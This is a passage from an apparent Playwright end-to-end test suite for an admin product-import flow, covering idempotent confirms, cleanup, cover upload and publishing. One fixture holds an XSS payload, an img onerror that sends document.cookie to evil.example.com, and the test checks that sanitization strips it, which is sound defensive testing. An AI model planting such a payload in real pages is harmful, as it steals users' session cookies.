      const bRequest = goldRequest('Gold Plan');
      const bPreviewResponsePromise = pageB.waitForResponse(isImportPreviewResponse);
      await pageB.getByTestId('admin-faka-import-preview-submit').click();
      const bPreviewResponse = await bPreviewResponsePromise;
      expect(bPreviewResponse.status()).toBe(200);
      const bPreviewRequestBody: unknown = bPreviewResponse.request().postDataJSON();
      expect(parseFakaImportRequest(bPreviewRequestBody)).toEqual(bRequest);
      const bPreviewBody: unknown = await bPreviewResponse.json();
      const bPreview = parseFakaPreviewResponse(bPreviewBody);
      expect(bPreview.sourceHash).toBe(aPreview.sourceHash);
      expect(bPreview.canConfirm).toBe(true);

      // ===== Page C: same Gold Plan offers, only the top-level productName changes =====
      // A/B send the identical request (productName: "Gold Plan"). C differs
      // only in the top-level productName ("Gold Plan Variant"); offers are
      // byte-for-byte the same as A/B, which the equality below proves.
      await pageC.goto('/admin');
      await pageC.getByRole('button', { name: '商品与库存', exact: true }).click();
      const cCatalogPromise = pageC.waitForResponse(isCatalogResponse);
      const cRegistryPromise = pageC.waitForResponse(isAdminCategoriesResponse);
      await pageC.getByTestId('admin-faka-import-open').click();
      const [cCatalogResponse, cRegistryResponse] = await Promise.all([
        cCatalogPromise,
        cRegistryPromise,
      ]);
      expect(cCatalogResponse.status()).toBe(200);
      expect(cRegistryResponse.status()).toBe(200);
      await pageC.getByTestId('admin-faka-import-plan').selectOption('77');
      await pageC.getByTestId('product-category-select').selectOption(String(networkNode.id));
      await pageC.getByTestId('admin-faka-import-name').fill('Gold Plan Variant');
      const cRequest = goldRequest('Gold Plan Variant');
      expect(cRequest).toEqual({ ...aRequest, productName: 'Gold Plan Variant' });
      const cPreviewResponsePromise = pageC.waitForResponse(isImportPreviewResponse);
      await pageC.getByTestId('admin-faka-import-preview-submit').click();
      const cPreviewResponse = await cPreviewResponsePromise;
      expect(cPreviewResponse.status()).toBe(200);
      const cPreviewRequestBody: unknown = cPreviewResponse.request().postDataJSON();
      expect(parseFakaImportRequest(cPreviewRequestBody)).toEqual(cRequest);
      const cPreviewBody: unknown = await cPreviewResponse.json();
      const cPreview = parseFakaPreviewResponse(cPreviewBody);
      expect(cPreview.sourceHash).toBe(aPreview.sourceHash);
      expect(cPreview.canConfirm).toBe(true);
      expect(cPreview.productName).toBe('Gold Plan Variant');
      expect(cPreview.offers).toEqual(aPreview.offers);

      // ===== Page A: confirm -> 201 replayed:false (idempotency key stored) =====
      let aConfirmCount = 0;
      const onAConfirm = (request: Request) => {
        if (request.method() === 'POST'
          && new URL(request.url()).pathname === '/api/admin/faka/import') {
          aConfirmCount += 1;
        }
      };
      page.on('request', onAConfirm);
      try {
        const aImportPromise = page.waitForResponse(isImportResponse);
        await page.getByTestId('admin-faka-import-submit').click({ clickCount: 2 });
        const aImportResponse = await aImportPromise;
        expect(aImportResponse.status()).toBe(201);
        expect(aConfirmCount).toBe(1);
        const aConfirmBody: unknown = aImportResponse.request().postDataJSON();
        expect(parseFakaConfirmRequest(aConfirmBody)).toEqual({ ...aRequest, sourceHash: aPreview.sourceHash });
        expect(readIdempotencyKey(aImportResponse.request())).toBe(FIXED_IDEMPOTENCY_KEY);
        const aImportBody: unknown = await aImportResponse.json();
        const aImported = parseFakaImportResponse(aImportBody);
        expect(aImported.replayed).toBe(false);
        expect(aImported.offerCount).toBe(2);
        productIdA = aImported.productId;
        const aSuccessToast = '“Gold Plan”已导入并保存为草稿';
        await expect(page.locator('[data-toast-card]').filter({ hasText: aSuccessToast })).toBeVisible();
        await page.getByTestId('admin-faka-import-preview').waitFor({ state: 'detached' });
        await expect(page.getByTestId('admin-publication-dialog')).toBeVisible();
        await page.getByTestId('admin-publication-later').click();
      } finally {
        page.off('request', onAConfirm);
      }

      // ===== Page B: same key + same request -> 200 replay, productId = A =====
      let bConfirmCount = 0;
      const onBConfirm = (request: Request) => {
        if (request.method() === 'POST'
          && new URL(request.url()).pathname === '/api/admin/faka/import') {
          bConfirmCount += 1;
        }
      };
      pageB.on('request', onBConfirm);
      try {
        const bImportPromise = pageB.waitForResponse(isImportResponse);
        await pageB.getByTestId('admin-faka-import-submit').click({ clickCount: 2 });
        const bImportResponse = await bImportPromise;
        expect(bImportResponse.status()).toBe(200);
        expect(bConfirmCount).toBe(1);
        const bConfirmBody: unknown = bImportResponse.request().postDataJSON();
        expect(parseFakaConfirmRequest(bConfirmBody)).toEqual({ ...bRequest, sourceHash: bPreview.sourceHash });
        expect(readIdempotencyKey(bImportResponse.request())).toBe(FIXED_IDEMPOTENCY_KEY);
        const bImportBody: unknown = await bImportResponse.json();
        const replayed = parseFakaReplayResponse(bImportBody);
        expect(replayed).toEqual({ productId: productIdA, replayed: true });
        const bReplayToast = '“Gold Plan”已存在，未重复创建';
        await expect(pageB.locator('[data-toast-card]').filter({ hasText: bReplayToast }))
          .toHaveText(`成功：${bReplayToast}`);
        await pageB.getByTestId('admin-faka-import-preview').waitFor({ state: 'detached' });
        await expect(pageB.getByTestId('admin-publication-dialog')).toBeVisible();
        await pageB.getByTestId('admin-publication-later').click();
      } finally {
        pageB.off('request', onBConfirm);
      }

      // ===== Page C: same key, different body -> 409 IDEMPOTENCY_KEY_REUSED =====
      let cConfirmCount = 0;
      const onCConfirm = (request: Request) => {
        if (request.method() === 'POST'
          && new URL(request.url()).pathname === '/api/admin/faka/import') {
          cConfirmCount += 1;
        }
      };
      pageC.on('request', onCConfirm);
      try {
        const cImportPromise = pageC.waitForResponse(isImportResponse);
        await pageC.getByTestId('admin-faka-import-submit').click({ clickCount: 2 });
        const cImportResponse = await cImportPromise;
        expect(cImportResponse.status()).toBe(409);
        expect(cConfirmCount).toBe(1);
        const cConfirmBody: unknown = cImportResponse.request().postDataJSON();
        expect(parseFakaConfirmRequest(cConfirmBody)).toEqual({ ...cRequest, sourceHash: cPreview.sourceHash });
        expect(readIdempotencyKey(cImportResponse.request())).toBe(FIXED_IDEMPOTENCY_KEY);
        const cConflictBody: unknown = await cImportResponse.json();
        const cConflict = parseFakaConflictError(cConflictBody);
        expect(cConflict.code).toBe('IDEMPOTENCY_KEY_REUSED');
        expect(cConflict.message).toBe('该幂等键已用于不同请求');

        // The dialog and its preview stay intact, the confirm button stays
        // enabled, and no "existing product" shortcut is rendered.
        await expect(pageC.getByTestId('admin-faka-import-preview')).toBeVisible();
        await expect(pageC.getByTestId('admin-faka-preview-result')).toBeVisible();
        await expect(pageC.getByTestId('admin-faka-import-submit')).toBeVisible();
        await expect(pageC.getByTestId('admin-faka-import-submit')).toBeEnabled();
        await expect(pageC.getByTestId('admin-faka-existing-product')).toHaveCount(0);
        await expect(pageC.locator('[data-toast-card]').filter({ hasText: '该幂等键已用于不同请求' }))
          .toBeVisible();
      } finally {
        pageC.off('request', onCConfirm);
      }

      // ===== Final real products back-check vs baseline =====
      await pageC.getByRole('dialog').getByRole('button', { name: '取消' }).click();
      await pageC.getByRole('button', { name: '数据仪表盘', exact: true }).click();
      const finalProductsPromise = pageC.waitForResponse(isAdminProductsResponse);
      await pageC.getByRole('button', { name: '商品与库存', exact: true }).click();
      const finalProductsResponse = await finalProductsPromise;
      expect(finalProductsResponse.status()).toBe(200);
      const finalBody: unknown = await finalProductsResponse.json();
      const finalProducts = parseAdminProductsResponse(finalBody);

      const baselineIds = baselineProducts.map((product) => product.id).sort((a, b) => a - b);
      const finalIds = finalProducts.map((product) => product.id).sort((a, b) => a - b);
      expect(finalIds).toHaveLength(baselineIds.length + 1);
      const addedIds = finalIds.filter((id) => !baselineIds.includes(id));
      expect(addedIds).toEqual([productIdA]);

      const goldSkuProducts = finalProducts.filter((product) =>
        product.offers.some((offer) =>
          offer.externalSku === 'gold-monthly' || offer.externalSku === 'gold-yearly'),
      );
      expect(goldSkuProducts).toHaveLength(1);
      const goldProduct = goldSkuProducts[0]!;
      expect(goldProduct.id).toBe(productIdA);
      expect(goldProduct.status).toBe('draft');
      expect(goldProduct.merchantId).toBeNull();
      expect(goldProduct.offers).toHaveLength(2);
      const goldSkus = goldProduct.offers.map((offer) => offer.externalSku).sort();
      expect(goldSkus).toEqual(['gold-monthly', 'gold-yearly']);
    } finally {
      // Exercise the real archive UI, then restore + purge this test-owned,
      // never-published draft through the lifecycle API. Archive intentionally
      // preserves offers and the Xboard link, so leaving it archived would
      // contaminate later imports that reuse the fixture SKUs.
      try {
        if (productIdA > 0) {
          const archiveButton = page.getByTestId(`admin-archive-product-${productIdA}`);
          const archiveResponsePromise = page.waitForResponse(
            (response) =>
              response.request().method() === 'POST'
              && new URL(response.url()).pathname === `/api/admin/products/${productIdA}/archive`,
          );
          const refreshResponsePromise = page.waitForResponse(isAdminProductsResponse);
          const dialogPromise = page.waitForEvent('dialog');

          const clickPromise = archiveButton.click();
          const archiveDialog = await dialogPromise;
          expect(archiveDialog.type()).toBe('confirm');
          expect(archiveDialog.message()).toContain('Gold Plan');
          expect(archiveDialog.message()).toContain('归档');
          await archiveDialog.accept();
          await clickPromise;

          const archiveResponse = await archiveResponsePromise;
          expect(archiveResponse.status()).toBe(200);
          const archiveBody = await archiveResponse.json() as { mode?: string; productId?: number };
          if (archiveBody.mode !== 'archived' || archiveBody.productId !== productIdA) {
            throw new Error('admin product archive response mismatch');
          }

          const refreshResponse = await refreshResponsePromise;
          expect(refreshResponse.status()).toBe(200);
          await expect(page.getByTestId(`admin-archive-product-${productIdA}`)).toHaveCount(0);
          await expect(
            page.locator('[data-toast-card]').filter({ hasText: '商品已归档' }),
          ).toBeVisible();

          const { accessToken } = await loginAsApi(page.request, SEED_ACCOUNTS.admin);
          const authHeaders = { Authorization: `Bearer ${accessToken}` };
          const restoreResponse = await page.request.post(
            `${API_BASE}/api/admin/products/${productIdA}/restore`,
            { headers: authHeaders },
          );
          expect(restoreResponse.status()).toBe(200);
          expect(await restoreResponse.json()).toMatchObject({
            productId: productIdA,
            status: 'draft',
            archivedAt: null,
          });

          const purgeResponse = await page.request.delete(
            `${API_BASE}/api/admin/products/${productIdA}/purge`,
            { headers: authHeaders },
          );
          expect(purgeResponse.status()).toBe(200);
          expect(await purgeResponse.json()).toMatchObject({
            mode: 'purged',
            productId: productIdA,
          });
        }
      } finally {
        try {
          await resetXboardFixture();
        } finally {
          try {
            await pageB.close();
          } finally {
            await pageC.close();
          }
        }
      }
    }
  });
  test('admin previews and confirms a sanitized Xboard draft via the real UI', async ({ page }) => {
    await resetXboardFixture();
    await loginAs(page, SEED_ACCOUNTS.admin);
    await page.goto('/admin');
    const networkCoverUrl = await ensureNetworkNodeDefaultCoverViaUi(page);

    await page.getByRole('button', { name: '商品与库存', exact: true }).click();

    const catalogResponsePromise = page.waitForResponse(isCatalogResponse);
    const registryResponsePromise = page.waitForResponse(isAdminCategoriesResponse);
    await page.getByTestId('admin-faka-import-open').click();

    const [catalogResponse, registryResponse] = await Promise.all([
      catalogResponsePromise,
      registryResponsePromise,
    ]);
    expect(catalogResponse.status()).toBe(200);
    expect(registryResponse.status()).toBe(200);

    const catalogBody: unknown = await catalogResponse.json();
    const catalog = parseFakaCatalogResponse(catalogBody);
    const goldPlan = catalog.plans.find((plan) => plan.plan_id === 77);
    expect(goldPlan).toEqual({
      plan_id: 77,
      name: 'Gold Plan',
      show: true,
      sell: true,
      content:
        'Gold Plan：每月 200GB 高速流量，适合主力使用，长期套餐更划算。欢迎购买！\n' +
        "<script>alert('gold-xss')</script>\n" +
        '<img src="https://evil.example.com/track.png" onerror="' +
        "fetch('https://evil.example.com/leak?c='+encodeURIComponent(document.cookie))\">",
      renew: true,
      group_id: 1,
      transfer_enable: 214748364800,
      capacity_limit: 200,
      active_users: 12,
      remaining: 188,
      periods: [
        { period: 'monthly', price: 3000, sku_alias: 'gold-monthly' },
        { period: 'yearly', price: 30000, sku_alias: 'gold-yearly' },
      ],
      named_skus: [
        { sku: 'gold-monthly', period: 'monthly' },
        { sku: 'gold-yearly', period: 'yearly' },
      ],
    });

    const registryBody: unknown = await registryResponse.json();
    const categories = parseAdminCategoryListResponse(registryBody);
    const networkNode = categories.find((category) => category.code === 'network-node');
    if (!networkNode) {
      throw new Error('active category registry is missing network-node');
    }

    await page.getByTestId('admin-faka-import-plan').selectOption('77');
    await page.getByTestId('product-category-select').selectOption(String(networkNode.id));

    const expectedRequest: FakaImportRequest = {
      planId: 77,
      productName: 'Gold Plan',
      categoryId: networkNode.id,
      cover: { mode: 'category_default' },
      offers: [
        { period: 'monthly', sku: 'gold-monthly', offerName: '月付', pricePoints: 300000 },
        { period: 'yearly', sku: 'gold-yearly', offerName: '年付', pricePoints: 3000000 },
      ],
    };

    const previewResponsePromise = page.waitForResponse(isImportPreviewResponse);
    await page.getByTestId('admin-faka-import-preview-submit').click();
    const previewResponse = await previewResponsePromise;
    expect(previewResponse.status()).toBe(200);
    const previewRequestBody: unknown = previewResponse.request().postDataJSON();
    expect(parseFakaImportRequest(previewRequestBody)).toEqual(expectedRequest);

    const previewBody: unknown = await previewResponse.json();
    const preview = parseFakaPreviewResponse(previewBody);
    expect(preview.sourceHash).toMatch(/^[0-9a-f]{64}$/);
    expect(preview.capacity).toEqual({ limit: 200, activeUsers: 12, remaining: 188, sellable: true });
    expect(preview.productName).toBe('Gold Plan');
    expect(preview.cover).toEqual({ imageUrl: networkCoverUrl, images: [networkCoverUrl] });
    expect(preview.offers).toEqual([
      { period: 'monthly', sku: 'gold-monthly', offerName: '月付', pricePoints: 300000, validityDays: 30 },
      { period: 'yearly', sku: 'gold-yearly', offerName: '年付', pricePoints: 3000000, validityDays: 365 },
    ]);
    expect(preview.issues).toEqual([]);
    expect(preview.canConfirm).toBe(true);

    const safeServerRichDescription = preview.richDescription ?? '';
    expect(safeServerRichDescription).toContain('Gold Plan');
    expect(safeServerRichDescription).toContain('每月 200GB 高速流量');
    expect(safeServerRichDescription).not.toMatch(/<script|<img|onerror|evil\.example\.com|javascript:/i);

    await expect(page.getByTestId('admin-faka-preview-result')).toBeVisible();
    const richPreview = page.getByTestId('admin-faka-rich-preview');
    await expect(richPreview).toBeVisible();
    await expect(richPreview).toContainText('Gold Plan');
    await expect(richPreview).toContainText('每月 200GB 高速流量');
    expect(await richPreview.innerHTML()).not.toMatch(/<script|<img|onerror|evil\.example\.com|javascript:/i);

    let confirmRequestCount = 0;
    const onConfirmRequest = (request: Request) => {
      if (request.method() === 'POST' && new URL(request.url()).pathname === '/api/admin/faka/import') {
        confirmRequestCount += 1;
      }
    };
    page.on('request', onConfirmRequest);

    try {
      const importResponsePromise = page.waitForResponse(isImportResponse);
      // Capture the real admin products list refresh triggered by onImported()
      // after confirm — no direct business-API write and no browser reload.
      const productsResponsePromise = page.waitForResponse(isAdminProductsResponse);
      const readinessResponsePromise = page.waitForResponse(isAdminReadinessResponse);
      await page.getByTestId('admin-faka-import-submit').click({ clickCount: 2 });
      const importResponse = await importResponsePromise;
      expect(importResponse.status()).toBe(201);
      expect(confirmRequestCount).toBe(1);

      const confirmRequestBody: unknown = importResponse.request().postDataJSON();
      expect(parseFakaConfirmRequest(confirmRequestBody)).toEqual({ ...expectedRequest, sourceHash: preview.sourceHash });
      expect(readIdempotencyKey(importResponse.request())).not.toHaveLength(0);

      const importBody: unknown = await importResponse.json();
      const imported = parseFakaImportResponse(importBody);
      expect(imported.replayed).toBe(false);
      expect(imported.offerCount).toBe(2);
      expect(imported.offers).toEqual(preview.offers);

      const successMessage = '“Gold Plan”已导入并保存为草稿';
      await expect(page.locator('[data-toast-card]').filter({ hasText: successMessage })).toBeVisible();
      await page.getByTestId('admin-faka-import-preview').waitFor({ state: 'detached' });

      // --- Admin products list back-check after the real onImported() refresh ---
      const productsResponse = await productsResponsePromise;
      expect(productsResponse.status()).toBe(200);
      const productsBody: unknown = await productsResponse.json();
      const products = parseAdminProductsResponse(productsBody);

      const importedProducts = products.filter((candidate) => candidate.id === imported.productId);
      expect(importedProducts).toHaveLength(1);
      const product = importedProducts[0]!;
      expect(product.id).toBe(imported.productId);
      expect(product.name).toBe('Gold Plan');
      expect(product.status).toBe('draft');
      expect(product.categoryId).toBe(networkNode.id);
      expect(product.merchantId).toBeNull();
      expect(product.imageUrl).toBe(networkCoverUrl);
      expect(product.images).toEqual([networkCoverUrl]);
      expect(product.price).toBe(300000);
      expect(product.fakaBridge).toBe(true);
      expect(product.fakaCapacity).toEqual({
        sku: 'gold-monthly',
        planId: 77,
        capacityLimit: 200,
        activeUsers: 12,
        remaining: 188,
        sellable: true,
        source: 'xboard',
      });

      expect(product.offers).toHaveLength(2);
      expect(product.offers.filter((offer) => offer.isDefault)).toHaveLength(1);
      const monthlyOffer = product.offers.find((offer) => offer.externalSku === 'gold-monthly');
      const yearlyOffer = product.offers.find((offer) => offer.externalSku === 'gold-yearly');
      const assertOffer = (
        offer: AdminProductOfferDto | undefined,
        expected: { name: string; isDefault: boolean; price: number; externalSku: string },
      ) => {
        if (!offer) {
          throw new Error(`admin products back-check: missing offer "${expected.externalSku}"`);
        }
        expect(offer.id).toBeGreaterThan(0);
        expect(offer.name).toBe(expected.name);
        expect(offer.status).toBe('active');
        expect(offer.isDefault).toBe(expected.isDefault);
        expect(offer.price).toBe(expected.price);
        expect(offer.externalIntegration).toBe('faka_bridge');
        expect(offer.externalSku).toBe(expected.externalSku);
      };
      assertOffer(monthlyOffer, { name: '月付', isDefault: true, price: 300000, externalSku: 'gold-monthly' });
      assertOffer(yearlyOffer, { name: '年付', isDefault: false, price: 3000000, externalSku: 'gold-yearly' });

      // Real DOM table back-check: unique row located via the product name cell.
      const productRow = page.locator('tbody tr').filter({
        has: page.locator('td[data-label="商品名称"]').getByText('Gold Plan', { exact: true }),
      });
      await expect(productRow).toHaveCount(1);
      const nameCell = productRow.locator('td[data-label="商品名称"]');
      await expect(nameCell).toContainText('Gold Plan');
      await expect(nameCell).toContainText('FakaBridge · Xboard');
      await expect(productRow.locator('td[data-label="售价 (积分)"]')).toHaveText('300000');
      await expect(productRow.locator('td[data-label="可售资源"]')).toHaveText('Xboard 188/200（在用 12）');
      await expect(productRow.getByTestId(`admin-product-status-${imported.productId}`)).toHaveText('草稿');
      await assertAdminProductRowReadable(page, 'Gold Plan', { width: 360, height: 800 });
      await assertAdminProductRowReadable(page, 'Gold Plan', { width: 1280, height: 800 });

      let publishRequestCount = 0;
      const onPublishRequest = (request: Request) => {
        if (request.method() === 'POST' && /\/api\/admin\/products\/\d+\/publish$/.test(new URL(request.url()).pathname)) {
          publishRequestCount += 1;
        }
      };
      page.on('request', onPublishRequest);
      try {
        const readinessResponse = await readinessResponsePromise;
        expect(readinessResponse.status()).toBe(200);
        const readinessBody: unknown = await readinessResponse.json();
        if (!isRecord(readinessBody) || readinessBody.ready !== true) {
          throw new Error('imported Xboard draft was not publication-ready');
        }
        expect(publishRequestCount).toBe(0);
        await expect(page.getByTestId('admin-publication-dialog')).toBeVisible();
        await expect(page.getByTestId('admin-publication-dialog')).toContainText('商品已导入，准备发布');
        await expect(page.getByTestId('admin-publication-dialog')).not.toContainText('OFFER_NOT_SELLABLE');
        await expect(page.getByTestId('publication-publish')).toBeEnabled();

        const publishResponsePromise = page.waitForResponse(isAdminPublishResponse);
        const publishedListPromise = page.waitForResponse(isAdminProductsResponse);
        await page.getByTestId('publication-publish').click();
        const publishResponse = await publishResponsePromise;
        expect(publishResponse.status()).toBe(200);
        const publishBody: unknown = await publishResponse.json();
        if (!isRecord(publishBody) || publishBody.status !== 'active' || publishBody.id !== imported.productId) {
          throw new Error('admin publish response did not activate the imported product');
        }
        expect(publishRequestCount).toBe(1);

        const publishedListResponse = await publishedListPromise;
        expect(publishedListResponse.status()).toBe(200);
        await expect(page.locator('[data-toast-card]').filter({ hasText: '“Gold Plan”已发布到商城' })).toBeVisible();
        await expect(page.getByTestId('admin-publication-dialog')).toHaveCount(0);
        await expect(productRow.getByTestId(`admin-product-status-${imported.productId}`)).toHaveText('已发布');

        const publicDetail = await page.request.get(`${API_BASE}/api/products/${imported.productId}`);
        expect(publicDetail.status()).toBe(200);
        const publicBody: unknown = await publicDetail.json();
        if (!isRecord(publicBody) || publicBody.id !== imported.productId || publicBody.name !== 'Gold Plan') {
          throw new Error('public product detail did not expose the published Xboard product');
        }

        await page.goto('/');
        const search = page.getByPlaceholder('搜账号、卡密、教程...');
        await expect(search).toBeVisible();
        await search.fill('Gold Plan');
        const card = page.getByTestId(`store-product-card-${imported.productId}`);
        await expect(card).toBeVisible({ timeout: 15_000 });
        await expect(card).toContainText('Gold Plan');
      } finally {
        page.off('request', onPublishRequest);
      }
    } finally {
      page.off('request', onConfirmRequest);
    }
  });

  test('admin uploads a local cover, previews and confirms via the real UI (SPEC-CMI-UX-001 §5.5, AC-UX-010)', async ({ page }) => {
    await resetXboardFixture();
    await loginAs(page, SEED_ACCOUNTS.admin);
    await page.goto('/admin');

    await page.getByRole('button', { name: '商品与库存', exact: true }).click();
    const catalogResponsePromise = page.waitForResponse(isCatalogResponse);
    const registryResponsePromise = page.waitForResponse(isAdminCategoriesResponse);
    await page.getByTestId('admin-faka-import-open').click();
    const [catalogResponse, registryResponse] = await Promise.all([
      catalogResponsePromise,
      registryResponsePromise,
    ]);
    expect(catalogResponse.status()).toBe(200);
    expect(registryResponse.status()).toBe(200);

    const registryBody: unknown = await registryResponse.json();
    const categories = parseAdminCategoryListResponse(registryBody);
    const networkNode = categories.find((category) => category.code === 'network-node');
    if (!networkNode) {
      throw new Error('active category registry is missing network-node');
    }

    // Use Basic Plan (plan 1) so this uploaded-cover journey does not collide
    // with the plan-77 category-default journeys in the sibling tests.
    await page.getByTestId('admin-faka-import-plan').selectOption('1');
    await page.getByTestId('product-category-select').selectOption(String(networkNode.id));

    // Choose the uploaded-cover mode and upload a real PNG (POST /api/uploads/image).
    await page.getByLabel('上传平台托管封面').click();
    const uploadResponsePromise = page.waitForResponse((response) =>
      response.request().method() === 'POST'
      && new URL(response.url()).pathname === '/api/uploads/image',
    );
    const png = Buffer.from(
      'iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwAEhQGAhKmMIQAAAABJRU5ErkJggg==',
      'base64',
    );
    await page.locator('input[type="file"]').setInputFiles({ name: 'cover.png', mimeType: 'image/png', buffer: png });
    const uploadResponse = await uploadResponsePromise;
    expect(uploadResponse.status()).toBe(200);
    const uploadBody: unknown = await uploadResponse.json();
    if (!isRecord(uploadBody) || typeof uploadBody.key !== 'string' || typeof uploadBody.url !== 'string') {
      throw new Error('upload response must be { key, url }');
    }
    // The upload key is the content-addressed objectKey (the write/confirm
    // trust anchor — never the client URL).
    expect(uploadBody.key).toMatch(/^[0-9a-f]{32}\.png$/);
    await expect(page.getByTestId('admin-faka-uploaded-cover-preview')).toBeVisible();

    const expectedRequest: FakaImportRequest = {
      planId: 1,
      productName: 'Basic Plan',
      categoryId: networkNode.id,
      cover: { mode: 'uploaded', objectKey: uploadBody.key },
      offers: [
        { period: 'monthly', sku: 'basic-monthly', offerName: '月付', pricePoints: 50000 },
        { period: 'yearly', sku: 'basic-yearly', offerName: '年付', pricePoints: 500000 },
      ],
    };

    const previewResponsePromise = page.waitForResponse(isImportPreviewResponse);
    await page.getByTestId('admin-faka-import-preview-submit').click();
    const previewResponse = await previewResponsePromise;
    expect(previewResponse.status()).toBe(200);
    const previewRequestBody: unknown = previewResponse.request().postDataJSON();
    // AC-UX-010: the preview request carries the objectKey, never a CDN URL.
    expect(parseFakaImportRequest(previewRequestBody)).toEqual(expectedRequest);

    const previewBody: unknown = await previewResponse.json();
    const preview = parseFakaPreviewResponse(previewBody);
    expect(preview.cover).toEqual({ imageUrl: uploadBody.url, images: [uploadBody.url] });
    expect(preview.canConfirm).toBe(true);

    const importResponsePromise = page.waitForResponse(isImportResponse);
    const productsResponsePromise = page.waitForResponse(isAdminProductsResponse);
    await page.getByTestId('admin-faka-import-submit').click({ clickCount: 2 });
    const importResponse = await importResponsePromise;
    expect(importResponse.status()).toBe(201);
    const confirmRequestBody: unknown = importResponse.request().postDataJSON();
    expect(parseFakaConfirmRequest(confirmRequestBody)).toEqual({ ...expectedRequest, sourceHash: preview.sourceHash });

    const importBody: unknown = await importResponse.json();
    const imported = parseFakaImportResponse(importBody);
    expect(imported.replayed).toBe(false);

    // 商品预览有图: the created draft's canonical cover URL is the uploaded one.
    const productsResponse = await productsResponsePromise;
    expect(productsResponse.status()).toBe(200);
    const productsBody: unknown = await productsResponse.json();
    const products = parseAdminProductsResponse(productsBody);
    const uploadedProduct = products.find((candidate) => candidate.id === imported.productId);
    expect(uploadedProduct).toBeDefined();
    expect(uploadedProduct!.imageUrl).toBe(uploadBody.url);
    expect(uploadedProduct!.images).toEqual([uploadBody.url]);
  });

});
